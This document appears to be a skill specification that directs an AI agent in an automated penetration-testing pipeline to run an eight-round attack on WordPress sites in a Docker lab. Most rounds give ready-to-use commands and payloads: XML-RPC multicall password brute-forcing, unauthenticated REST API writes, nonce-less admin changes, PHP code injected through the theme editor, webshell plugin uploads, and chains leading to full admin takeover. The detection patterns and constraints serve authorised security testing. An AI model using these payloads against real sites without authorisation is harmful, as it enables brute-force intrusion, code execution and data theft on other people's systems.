## Identity

| Field | Value |
|-------|-------|
| Skill ID | S-054-B |
| Phase | Phase-4 (Attack) |
| Responsibility | Execute 8-round progressive attack against WordPress-specific vulnerability sinks |

## Input Contract

| File | Source | Required | Fields Used |
|------|--------|----------|-------------|
| Attack plan | `$WORK_DIR/attack_plans/{sink_id}_plan.json` | ✅ | `vectors`, `filter_analysis`, `bypass_strategies` |
| Credentials | `$WORK_DIR/credentials.json` | ✅ | `cookies`, `tokens`, `api_keys` |
| Container | Docker `php` container | ✅ | `exec` access |
## 8-Round Attack


#### R1 Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | {URL from attack plan} |
| injection_point | {parameter name from plan} |
| payload | {payload from this round's strategy} |
| evidence_command | {docker exec or curl command to verify} |
| expected_evidence | {what confirms success} |

### R1 - WordPress Core Known Vulnerabilities

Match known CVEs based on the detected version:

Version identification:
```bash
docker exec php cat $TARGET_PATH/wp-includes/version.php | grep wp_version
```

High-risk vulnerability patterns:
- WP < 5.0: REST API unauthorized content modification (CVE-2017-1001000)
- WP < 5.2: Deserialization RCE
- WP < 5.7: XXE via Media Library
- WP < 6.0: SQL injection via WP_Query
- Query the `wpscan` database or `wpvulndb` API

**Evidence:** Confirmed exploitable known CVE via version matching.


#### R2 Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | {URL from attack plan} |
| injection_point | {parameter name from plan} |
| payload | {payload from this round's strategy} |
| evidence_command | {docker exec or curl command to verify} |
| expected_evidence | {what confirms success} |

### R2 - Plugin Vulnerability Audit

For each installed plugin:

1. Extract plugin version: `Stable tag:` in `readme.txt`
2. Match known CVEs (WPScan database)
3. Focus on auditing high-risk plugin code:
   - **SQL Injection**: `$wpdb->query("... $var ...")` without `prepare()`
   - **XSS**: `echo $_GET['param']` without `esc_html()`
   - **File Upload**: Custom upload handling missing type validation
   - **Privilege Bypass**: `wp_ajax_nopriv_*` Hook exposing sensitive operations
   - **Object Injection**: `maybe_unserialize()` processing user input

Priority plugins for audit (high install count, broad attack surface):
- Contact Form 7, WooCommerce, Elementor, Yoast SEO
- WPBakery, ACF, WP Super Cache, W3 Total Cache
- UpdraftPlus, All in One SEO, Wordfence

**Evidence:** Exploitable vulnerability found in a plugin.


#### R3 Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | {URL from attack plan} |
| injection_point | {parameter name from plan} |
| payload | {payload from this round's strategy} |
| evidence_command | {docker exec or curl command to verify} |
| expected_evidence | {what confirms success} |

### R3 - XML-RPC Attack

WordPress XML-RPC interface `/xmlrpc.php`:

1. **Detect enabled status**:
   ```bash
   docker exec php curl -s -X POST http://nginx:80/xmlrpc.php \
     -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'
   ```
2. **Brute force**: `wp.getUsersBlogs` method bypassing login rate limiting
   ```xml
   <methodCall>
     <methodName>wp.getUsersBlogs</methodName>
     <params>
       <param><value>admin</value></param>
       <param><value>password_guess</value></param>
     </params>
   </methodCall>
   ```
3. **Multicall amplification**: `system.multicall` multiple attempts per single request
   ```xml
   <methodCall>
     <methodName>system.multicall</methodName>
     <params><param><value><array><data>
       <value><struct>
         <member><name>methodName</name><value>wp.getUsersBlogs</value></member>
         <member><name>params</name><value><array><data>
           <value>admin</value><value>pass1</value>
         </data></array></value></member>
       </struct></value>
       <!-- Repeat 100 times with different passwords -->
     </data></array></value></param></params>
   </methodCall>
   ```
4. **XXE**: Inject external entities in XML-RPC requests
5. **SSRF**: `wp.pingback.ping` method triggering server-side requests

**Evidence:** Successful brute force via XML-RPC or SSRF trigger.


#### R4 Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | {URL from attack plan} |
| injection_point | {parameter name from plan} |
| payload | {payload from this round's strategy} |
| evidence_command | {docker exec or curl command to verify} |
| expected_evidence | {what confirms success} |

### R4 - REST API Vulnerabilities

1. **User enumeration**:
   ```bash
   docker exec php curl -s http://nginx:80/wp-json/wp/v2/users
   # Or http://nginx:80/?author=1 → redirect leaks username
   ```
2. **Unauthorized content access**:
   ```bash
   docker exec php curl -s http://nginx:80/wp-json/wp/v2/posts?status=draft
   docker exec php curl -s http://nginx:80/wp-json/wp/v2/posts?per_page=100
   ```
3. **REST API write**:
   ```bash
   # Attempt unauthenticated modification
   docker exec php curl -s -X POST http://nginx:80/wp-json/wp/v2/posts/1 \
     -H "Content-Type: application/json" \
     -d '{"title":"hacked","content":"pwned"}'
   ```
4. **Custom REST endpoint audit**:
   - Search for `register_rest_route()` where `permission_callback` is `__return_true` or empty
   - Search for routes without `permission_callback` set (WP 5.5+ will warn)

**Evidence:** Unauthorized access to draft/private content, or successful username enumeration.


#### R5 Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | {URL from attack plan} |
| injection_point | {parameter name from plan} |
| payload | {payload from this round's strategy} |
| evidence_command | {docker exec or curl command to verify} |
| expected_evidence | {what confirms success} |

### R5 - Shortcode Injection

Objective: Inject WordPress shortcodes into user-controllable content.

Analysis:
```bash
# Search for shortcode registrations
grep -rn "add_shortcode\|do_shortcode" $TARGET_PATH/ --include="*.php"
```

Attack vectors:
- Inject in comments/bio: `[gallery ids="1,2,3"]`
- Dangerous shortcodes: Third-party shortcodes that execute PHP code
- Nested shortcodes: `[shortcode1][shortcode2 param="injection"][/shortcode1]`
- Attribute injection: `[shortcode param='"><script>alert(1)</script>']`

If a PHP-executing shortcode exists (e.g., `[php]echo system('id');[/php]`):
- Inject the shortcode in comments → RCE

**Evidence:** Shortcode parsed and executed in an unintended context.


#### R6 Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | {URL from attack plan} |
| injection_point | {parameter name from plan} |
| payload | {payload from this round's strategy} |
| evidence_command | {docker exec or curl command to verify} |
| expected_evidence | {what confirms success} |

### R6 - Nonce Bypass and CSRF

WordPress Nonce security analysis:

1. **Missing Nonce**: Admin operations not validating Nonce
   ```bash
   # Submit admin operation without _wpnonce
   docker exec php curl -s -X POST "http://nginx:80/wp-admin/options.php" \
     -H "Cookie: $ADMIN_COOKIE" \
     -d "blogname=hacked&_wpnonce="
   ```
2. **Nonce leakage**: Nonce exposed to low-privilege users in HTML or API responses
3. **Nonce lifetime**: WordPress Nonce validity is 24 hours (two ticks, 12 hours each)
4. **`is_admin()` misuse**:
   ```php
   if (is_admin()) { /* Perform sensitive operation */ }
   // is_admin() only checks if on an admin page, NOT permissions!
   // Subscriber accessing /wp-admin/ also returns true
   ```
5. **Missing `check_ajax_referer`**: AJAX operations without Nonce validation

**Evidence:** Admin operation successfully executed without Nonce or with a forged Nonce.


#### R7 Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | {URL from attack plan} |
| injection_point | {parameter name from plan} |
| payload | {payload from this round's strategy} |
| evidence_command | {docker exec or curl command to verify} |
| expected_evidence | {what confirms success} |

### R7 - Theme/Plugin Editor RCE

Objective: Achieve code execution via the WordPress admin editor.

1. **File editor** (requires admin privileges + `DISALLOW_FILE_EDIT` not set):
   ```bash
   # Check if editor is available
   docker exec php curl -s http://nginx:80/wp-admin/theme-editor.php \
     -H "Cookie: $ADMIN_COOKIE" | grep -c "textarea"

   # Modify theme file to inject code
   docker exec php curl -s -X POST http://nginx:80/wp-admin/theme-editor.php \
     -H "Cookie: $ADMIN_COOKIE" \
     -d "_wpnonce=$NONCE&file=header.php&newcontent=<?php system('id'); ?>"
   ```
2. **Plugin installation** (requires `DISALLOW_FILE_MODS` not set):
   - Upload a malicious plugin ZIP containing a webshell
3. **Media library upload**:
   - Upload a PHP file disguised as an image
   - Combined with `.htaccess` modification for execution

**Evidence:** File modified via editor can execute PHP code.


#### R8 Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | {URL from attack plan} |
| injection_point | {parameter name from plan} |
| payload | {payload from this round's strategy} |
| evidence_command | {docker exec or curl command to verify} |
| expected_evidence | {what confirms success} |

### R8 - Combined Attack Chains

1. **User enumeration → XML-RPC brute force → Admin login → Editor RCE**:
   REST API obtains username → multicall brute force → edit functions.php → system command execution
2. **Plugin vulnerability → SQLi → Admin password hash → Offline cracking → Takeover**:
   Plugin SQL injection → read wp_users table → crack phpass hash → admin login
3. **Subscriber registration → AJAX privilege bypass → Option modification → Admin registration**:
   Register low-privilege user → `wp_ajax_*` without permission check → `update_option('users_can_register', 1)` + `update_option('default_role', 'administrator')`
4. **REST API unauthorized → Content injection stored XSS → Admin cookie theft → Takeover**
5. **Deserialization → POP chain → wp-config.php read → Database credentials → Data exfiltration**:
   WordPress core POP chain: `WP_HTML_Token` + `WP_Theme` chain

**Success criteria:** Complete chain from low privilege to full WordPress admin control.

## Evidence Requirements

| Evidence Type | Example |
|---|---|
| User enumeration | `/wp-json/wp/v2/users` returns user list |
| XML-RPC brute force | `system.multicall` successfully matches password |
| REST API unauthorized | Unauthenticated reading of draft/private posts |
| Plugin vulnerability | Contact Form 7 SQL injection returns database version |
| Nonce bypass | Successfully modified site options without Nonce |
| Editor RCE | Modified header.php executes command output |

## Report Format

```json
{
  "vuln_type": "WordPress",
  "sub_type": "core_cve|plugin_vuln|xmlrpc|rest_api|shortcode|nonce_bypass|editor_rce",
  "round": 3,
  "endpoint": "POST /xmlrpc.php",
  "component": "WordPress Core 6.2 / Plugin: contact-form-7 5.7",
  "payload": "system.multicall with 100 password guesses",
  "evidence": "admin password matched: password123",
  "confidence": "confirmed|highly_suspected|potential_risk",
  "impact": "admin_access|code_execution|data_leak",
  "remediation": "Disable XML-RPC, restrict REST API access, set DISALLOW_FILE_EDIT, update plugins to latest version"
}
```

## Detection (Vulnerability Pattern Recognition)

The following code/configuration patterns indicate potential security vulnerabilities in a WordPress site:
- Pattern 1: `$wpdb->query("SELECT * FROM {$wpdb->prefix}users WHERE id=$input")` — SQL concatenation in `$wpdb` without using `prepare()`
- Pattern 2: `wp_ajax_nopriv_*` Hook performing sensitive operations without `check_ajax_referer()` — Unauthenticated AJAX endpoint
- Pattern 3: `echo $_GET['search']` in theme templates — Reflected XSS in themes/plugins
- Pattern 4: `xmlrpc.php` accessible + `system.multicall` enabled — XML-RPC batch authentication brute force
- Pattern 5: `define('DISALLOW_FILE_EDIT', false)` or not set — Admin panel can directly edit theme/plugin PHP files (admin → RCE)
- Pattern 6: `siteurl`/`home` in `wp_options` table can be modified via SQL injection — Combined with WP auto-update mechanism for RCE

## Key Insight

> **Key point**: WordPress audit priority order: (1) Plugin vulnerabilities (accounting for 90%+ of WP vulnerabilities — focus on auditing `wp_ajax_nopriv_*` and `$wpdb->query()` calls in custom and niche plugins); (2) Theme XSS (`echo` of unescaped user input); (3) Core configuration (XML-RPC brute force, REST API user enumeration, file editor not disabled). WordPress's Hook mechanism makes the attack surface highly dispersed — each active plugin MUST be audited individually.

### Smart Pivot (Stuck Detection)

When 3 consecutive rounds fail (current round ≥ 4), trigger a smart pivot:

1. Reconnaissance refresh: Re-read target code to find overlooked filtering logic and alternative entry points
2. Cross-intelligence: Consult findings from other specialists in the shared discovery store (`$WORK_DIR/audit_session.db`)
3. Decision tree matching: Select a new attack direction based on failure patterns in `shared/pivot_strategy.md`
4. If no new paths are found, terminate early to avoid wasting rounds on hallucinated results

## Prerequisite Conditions and Scoring (MUST be filled)

The output `exploits/{sink_id}.json` MUST contain the following two objects:

### prerequisite_conditions
```json
{
  "auth_requirement": "anonymous|authenticated|admin|internal_network",
  "bypass_method": "Authentication bypass method, null if none",
  "other_preconditions": ["Precondition 1", "Precondition 2"],
  "exploitability_judgment": "directly_exploitable|conditionally_exploitable|not_exploitable"
}
```
- `auth_requirement` MUST match the auth_level of the corresponding route in auth_matrix.json
- `exploitability_judgment = "not_exploitable"` → final_verdict is at most potential
- `other_preconditions` SHALL list all non-authentication prerequisites (e.g., PHP configuration, Composer dependencies, environment variables)

### severity (Three-dimensional scoring, see shared/severity_rating.md for details)
```json
{
  "reachability": 0-3, "reachability_reason": "...",
  "impact": 0-3, "impact_reason": "...",
  "complexity": 0-3, "complexity_reason": "...",
  "score": "R×0.40+I×0.35+C×0.25",
  "cvss": "(score/3.0)×10.0",
  "level": "C|H|M|L",
  "vuln_id": "C-RCE-001"
}
```
- All reason fields MUST contain specific justification and MUST NOT be empty
- score and evidence_score MUST be consistent (≥2.10→≥7, 1.20-2.09→4-6, <1.20→1-3)

### Evidence Contract References (EVID)

Each vulnerability conclusion MUST reference the following evidence points in the `evidence` field (refer to `shared/evidence_contract.md`):
- `EVID_WP_COMPONENT_SCOPE` — WordPress component scope ✅ Required
- `EVID_WP_HOOK_ENTRY` — Hook entry point ✅ Required
- `EVID_WP_NONCE_STATUS` — Nonce status (conditionally required)
- `EVID_WP_CVE_VERSION_MATCH` — CVE version match (conditionally required)
- `EVID_WP_EXPLOIT_RESPONSE` — Exploit response evidence (required when confirmed)

Missing required EVID → conclusion automatically downgraded (confirmed→suspected→unverified).

### Attack Memory Write-back

After the attack cycle concludes, write experience to the attack memory store (see `shared/attack_memory.md` write protocol for format):

- ✅ confirmed: Record successful payload type + bypass technique + successful round
- ❌ failed (≥3 rounds): Record all excluded strategies + failure reasons
- ⚠️ partial: Record partially successful strategies + blocking reasons
- ❌ failed (<3 rounds): Do not record

Use `bash tools/audit_db.sh memory-write '<json>'` to write. SQLite WAL mode automatically ensures concurrency safety.

## Output

After completing all rounds, write the final results to `$WORK_DIR/exploits/{sink_id}.json`, following the format in `shared/data_contracts.md` Section 9 (`exploit_result.json`).

## Collaboration

- Pass discovered credentials to the privilege escalation auditor
- Pass SQL injection findings to the SQLi auditor
- Pass XSS findings to the XSS/SSTI auditor
- Submit all findings to the QA inspector for evidence verification

## Constraints

- SHALL only be activated when `framework=WordPress` in `environment_status.json`
- XML-RPC brute force MUST NOT exceed 500 attempts
- MUST NOT modify critical configuration in `wp_options` (e.g., `siteurl`)
- MUST NOT delete any content (posts, pages, users)
- Plugin code audit takes priority over blind testing to reduce noise


## Output Contract

| File | Path | Format |
|------|------|--------|
| Exploit result | `$WORK_DIR/exploit_results/{sink_id}_result.json` | JSON per `shared/data_contracts.md` §9 |
| PoC script | `$WORK_DIR/PoC脚本/{sink_id}_poc.py` | Python PoC |

### ✅ GOOD Output Example

```json
{
  "sink_id": "WP-001",
  "vuln_type": "WordPress",
  "sub_type": "xmlrpc",
  "final_verdict": "confirmed",
  "rounds_executed": 4,
  "confirmed_round": 3,
  "endpoint": "POST /xmlrpc.php",
  "component": "WordPress Core 6.2",
  "payload": "system.multicall with 100 wp.getUsersBlogs attempts",
  "evidence": "EVID_WP_COMPONENT_SCOPE: WordPress Core 6.2 — wp-includes/version.php confirms $wp_version='6.2'; EVID_WP_HOOK_ENTRY: xmlrpc.php enabled, system.listMethods returns wp.getUsersBlogs; EVID_WP_EXPLOIT_RESPONSE: multicall brute force matched admin:password123, HTTP 200 with blog list returned",
  "confidence": "confirmed",
  "impact": "Admin credential brute-forced via XML-RPC multicall",
  "prerequisite_conditions": { "auth_requirement": "anonymous", "exploitability_judgment": "directly_exploitable" },
  "severity": { "reachability": 3, "impact": 3, "complexity": 2, "score": 2.70, "cvss": 9.0, "level": "C" }
}
```

### ❌ BAD Output Example

```json
{
  "sink_id": "WP-001",
  "vuln_type": "WordPress",
  "final_verdict": "confirmed",
  "evidence": "XML-RPC is enabled",
  "severity": { "level": "C" }
}
// ❌ XML-RPC enabled alone is not a vulnerability — no exploit proof
// ❌ Missing component version, endpoint, payload
// ❌ No EVID references
// ❌ severity missing scores and reasons
```


---

## Pre-Submission Self-Check (MUST be performed)

After completing the exploit JSON, perform item-by-item self-check per `shared/auditor_self_check.md`:

1. Execute the 8 general items (G1-G8); proceed only when all are ✅
2. Execute the specialized self-check below (S1-S3); submit only when all are ✅
3. If any item is ❌ → correct and re-check; MUST NOT skip

### Specialized Self-Check (WordPress Auditor specific)
- [ ] S1: Vulnerability component type (core/theme/plugin) and version number are annotated
- [ ] S2: Usage of WordPress-specific functions (wp_ajax/wpdb/sanitize_*) has been analyzed
- [ ] S3: Missing permission checks (current_user_can/nonce validation) have been confirmed

## Shared Protocols
> 📄 `skills/shared/round_record_format.md` (S-101) — Per-round JSON format
> 📄 `skills/shared/smart_skip_protocol.md` (S-102) — Smart skip
> 📄 `skills/shared/smart_pivot_protocol.md` (S-103) — Smart pivot
> 📄 `skills/shared/prerequisite_scoring_3d.md` (S-104) — 3D scoring
> 📄 `skills/shared/attack_memory_writer.md` (S-105) — Memory write
> 📄 `skills/shared/second_order_tracking.md` (S-106) — Second-order tracking
> 📄 `skills/shared/general_self_check.md` (S-108) — G1-G8 self-check
